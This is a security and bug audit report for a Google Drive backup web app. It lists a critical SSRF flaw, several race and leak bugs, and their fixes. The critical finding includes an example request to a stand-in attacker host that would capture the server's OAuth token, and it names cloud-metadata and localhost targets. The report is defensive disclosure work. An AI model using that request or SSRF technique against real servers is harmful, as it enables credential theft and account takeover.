# Bug Audit Report — 2026-07-27

Full-stack review of drive-backup-console. Issues ordered by severity.

---

## 🚨 CRITICAL

### C1. Thumbnail endpoint: SSRF + Google OAuth token exfiltration

**Location**: `internal/api/files_handlers_ext.go:247-284`

**What**: The `Thumbnail` handler accepts a user-controlled URL via the `?link=` query parameter and fetches it server-side using the Drive client's HTTP stack:

```go
thumbURL := strings.TrimSpace(r.URL.Query().Get("link"))   // line 247
req, err := http.NewRequestWithContext(r.Context(), http.MethodGet, thumbURL, nil)
res, err := client.HTTP.Do(req)   // line 269
```

`client.HTTP` is the retry/gzip wrapper around `oauth2.NewClient`. The `oauth2.Transport` attaches `Authorization: Bearer <Google access token>` to **every** request regardless of destination host.

**Impact**:
- Any authenticated user (or API-key holder — route also exposed at `/api/v1/files/{id}/thumbnail`) can call `GET /api/files/x/thumbnail?link=https://attacker.example/` and receive the server's Google OAuth access token in their own server logs → full Drive account takeover until token expiry.
- The server can be used as an SSRF proxy: response body and Content-Type are streamed back verbatim (lines 281-284), so internal hosts (`http://127.0.0.1:*`, cloud metadata `169.254.169.254`) are reachable and readable.

**Fix**: Validate `link` against an allowlist of Google thumbnail hosts (must parse as HTTPS and host suffix must be `googleapis.com` or `ggpht.com`). Reject all other URLs with 400. Alternatively, drop the fast path and always derive the thumbnail URL from `GetMeta`.

## 🔴 HIGH

### H1. `loadMoreFiles` race condition — wrong-folder data merged into list

**Location**: `web/src/App.tsx:561-587`

**What**: Unlike `loadFiles` (which uses `listAbortRef` to cancel stale requests), `loadMoreFiles` has no AbortController and no folder-generation guard.

**Reproduction**: User clicks "Load more" in folder A (page-2 fetch in flight) → user navigates to folder B → `loadFiles(B)` replaces `items` → the stale page-2 response for A resolves and `setItems(prev => merged)` (line 569-576) appends folder A's files into folder B's listing. The merge also never updates `folderCacheRef`, so the cache and view diverge.

**Fix**: Capture `folderId` at call time and discard the result if it changed, or route through `listAbortRef`.

---

### H2. `saveEditor` stale-closure overwrites edits typed during save (data loss)

**Location**: `web/src/App.tsx:1339-1348`

**What**: `setEditor({ ...editor, original: editor.content, saving: false })` spreads the `editor` object captured when `saveEditor` was invoked. If the user keeps typing while the PUT is in flight, the post-await `setEditor` clobbers `content` back to the pre-save text — keystrokes are silently lost. Both the success and error branches do this.

**Fix**: Use functional update: `setEditor(prev => prev ? { ...prev, original: prev.content, saving: false, error: null } : prev)`.

---

### H3. `AppendChunk` flushing race — concurrent PUTs to one Drive session

**Location**: `internal/upload/service.go:181-302`

**What**: The flush loop clears `j.flushing` before breaking (lines 199, 211), then Phase 3 unconditionally clears it again at line 268:

```go
// Phase 3
j.mu.Lock()
j.flushing = false   // line 268 — may clobber another goroutine's flushing=true
```

Sequence: goroutine A exits the loop (clears flushing, unlocks); goroutine B appends a chunk, sees `flushing==false`, sets it true and starts network I/O; A enters Phase 3 and resets `flushing=false`; goroutine C now also acquires flushing. B and C both run `UploadRange` against the same session URL with the same `start := j.BytesSent` → overlapping/duplicate chunk PUTs violating Drive's sequential-offset protocol. The error path (lines 230-236) sets `StatusFailed` unconditionally, so a job concurrently completed by the other goroutine can be flipped back to failed.

**Fix**: In Phase 3, only clear `flushing` if this goroutine is still the flusher (track a per-goroutine flush generation), or restructure so the flag is cleared exactly once by the loop owner.

### H4. Upload jobs never deleted — unbounded memory + disk growth

**Location**: `internal/upload/store.go:15-18`, `internal/upload/persist.go:202-206`

**What**: `Store.Delete` is never called from production code. There is no reaper goroutine and no runtime TTL. The 24-hour pruning in `loadFromDisk` (persist.go:202-206) runs **only at startup**. Consequences:
- The in-memory `jobs` map grows forever with completed/failed/cancelled jobs.
- `saveToDisk` serializes every non-pending job, so `uploads.json` also grows without bound.
- An authenticated user can POST `/api/uploads` in a loop; each call creates a Drive resumable session plus a permanent map entry.

Additionally, on `UploadRange` error (service.go:229-237) the job is marked failed but `j.buffer` is never nilled — up to 32 MiB retained per failed upload. Compare the completion path (line 256: `j.buffer = nil`) and cancel (line 317: `j.buffer = nil`).

**Fix**: Add a periodic reaper goroutine (e.g. every 10 minutes, delete terminal jobs older than 1 hour). Nil the buffer on the error path.

### H5. Runtime persistence is dead code — Service bypasses PersistentStore

**Location**: `cmd/server/main.go:67-68`

**What**:

```go
uploadStore := upload.NewPersistentStore(filepath.Join(cfg.DataDir, "uploads.json"))
uploadSvc := &upload.Service{Store: uploadStore.Store}   // inner *Store, not the PersistentStore
```

`Service` calls `s.Store.Put/Update` on the embedded plain `Store`, so `PersistentStore.Put/Update` (the only things that call `scheduleSave`) are never invoked. `uploads.json` is written only by `SaveNow()` during graceful shutdown (main.go:113). Any crash / SIGKILL / OOM loses all upload state, and the debounced-save machinery (persist.go:56-80) never runs.

**Fix**: Give `Service` a store interface and pass `uploadStore` itself, or call `scheduleSave` from within the base store.

---

### H6. Stale async races in `openImageFile` / `openTextFile` — blob URL leak

**Location**: `web/src/App.tsx:1254-1298` and `1300-1328`

**What**: Neither function guards against a superseded response. Open image A then quickly B: `fetchFileBlob(A)` resolves after B is open, sets `imageUrlRef.current = urlA` and calls `setImagePreview({id: A...})`, so the lightbox shows A's pixels under stale state; when B resolves it overwrites `imageUrlRef` without revoking `urlA` → leaked blob URL (blob stays in memory until tab close). Same pattern in `openTextFile`: a slow fetch for A resolves after B and replaces the editor with A's content.

**Fix**: Compare against a request-sequence ref before applying results; revoke orphaned URLs.

---

### H7. Logout does not abort in-flight uploads

**Location**: `web/src/App.tsx:665-682`

**What**: `onLogout` does `setJobs([])` but never iterates `uploadAbortRef.current` to abort. The `uploadFile` chunk loops keep PUTting chunks after sign-out (hitting 401s, burning the 5-retry/backoff budget in api.ts:733-771), and `appendUploadHistory`/`patchJob` callbacks keep firing against a signed-out app.

**Fix**: Abort all controllers in `uploadAbortRef` before clearing jobs.

## 🟡 MEDIUM

### M1. Whole-App re-render storm during uploads

**Location**: `web/src/App.tsx:191, 285-287, 1470-1472`

**What**: `onProgress` → `patchJob` → `setJobs` fires ~every 80ms per chunk, with up to 2 pipelined + 4 concurrent uploads. Every tick re-renders the entire 3133-line `App` component (~60 state hooks). `FileRow` is correctly memoized, but `Sidebar`, `MobileNav`, `ToastHost`, `UploadToastHost`, and every inline modal subtree are not memoized and receive fresh inline-arrow props, so they all re-render on every tick.

**Fix**: Isolate upload progress into a child component/context (e.g. zustand) so ticks don't touch the file-list subtree.

---

### M2. `listFolderRecursive`: no cycle protection, no depth/count limit

**Location**: `internal/drive/zip.go:17-100`

**What**: Drive folders can have multiple parents (shared drives, shortcuts), so the recursion by `item.ID` can revisit a folder → infinite recursion / exponential blowup (no visited set, no depth limit). It also accumulates metadata for the entire tree in memory before the zip starts (unbounded for huge trees), and silently skips children on recursion error (lines 85-89), producing incomplete archives with no indication.

**Fix**: Add a `visited map[string]bool`, a `maxDepth` (e.g. 10), and a `maxFiles` (e.g. 5000) limit. Return an error when exceeded.

---

### M3. ETag 304 check happens after the upstream media fetch

**Location**: `internal/api/files_handlers.go:219-246`

**What**: The full-download branch opens the Drive media stream (`DownloadMedia`/`Download`) and only then compares `If-None-Match` (line 242). Every conditional revalidation triggers an upstream full-file GET that is aborted after headers — wasting Drive bandwidth/quota on every refresh of a cached preview.

**Fix**: Check the ETag (from the hint params or a `GetMeta`) before opening media.

---

### M4. `busy` held for the entire multi-upload batch — locks toolbar

**Location**: `web/src/App.tsx:1582-1621`

**What**: `onPickFile` sets `setBusy(true)` and only clears it in `finally` after `Promise.all(workers)` — i.e., after every file finishes. Uploading one large (multi-GB, resumable) file keeps `busy=true` for the whole transfer, which disables Upload, New Folder, New File, the sidebar Logout and Refresh, and the empty-state Upload button. Long uploads effectively lock the toolbar.

**Fix**: `busy` should gate only the synchronous pick/mkdir actions, not resumable transfers (which already have their own job cards).

---

### M5. No count/size caps on zip endpoints

**Location**: `internal/api/files_handlers_ext.go:377-419` (MultiZip), `157-192` (DownloadZip)

**What**: `MultiZip` accepts a 1 MiB JSON body → thousands of items, each 2 upstream calls, with unbounded total output size and runtime; one request can monopolize a handler goroutine, an upstream connection, and Drive quota for a very long time. The Batch endpoint has a 100-item cap (line 308); zip does not.

**Fix**: Add an item-count cap (e.g. 200) and/or a total-size cap.

---

### M6. `downloadMultiZip` buffers entire blob in browser memory

**Location**: `web/src/lib/api.ts:968-985`

**What**: `await res.blob()` buffers the entire zip response in memory before triggering download. Selecting 50 large files can spike browser memory. Additionally, `URL.revokeObjectURL(url)` is called immediately after `a.click()` (line 984) which can abort the download in some browsers before the fetch of the blob URL starts.

**Fix**: Have the backend set `Content-Disposition: attachment` and use a direct `<a href>` navigation (no fetch). Or revoke after a `setTimeout(..., 5000)`.

---

### M7. Server has no Read/Write timeouts — slow-client goroutine pinning

**Location**: `cmd/server/main.go:89-90`

**What**: `ReadTimeout: 0` and `WriteTimeout: 0` are deliberate for streaming, but a client that opens a download and never reads (zero TCP window) pins the handler goroutine plus the upstream Drive connection indefinitely — `r.Context()` only cancels on disconnect, not on stall.

**Fix**: Consider a per-response idle deadline or per-handler timeout wrapping on non-stream routes.
